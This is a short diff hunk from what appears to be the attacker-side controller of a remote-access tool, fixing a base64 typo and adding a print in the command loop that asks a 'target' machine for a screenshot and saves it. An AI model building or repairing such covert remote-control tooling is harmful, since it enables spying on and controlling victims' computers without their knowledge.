@@ -92,9 +92,10 @@ def target_communication():
         elif command == 'screenshot':
             # If the user enters 'screenshot', send a command to take a screenshot on the target.
             shot = reliable_recv()
+            print(shot)
             if shot:
                 with open('screenshot.png', 'wb') as f:
-                    f.write(base64.b4decode(shot))
+                    f.write(base64.b64decode(shot))
                 # If the screenshot command is successful, print the result.
                 print('[+] Screenshot taken successfully.')
             else:
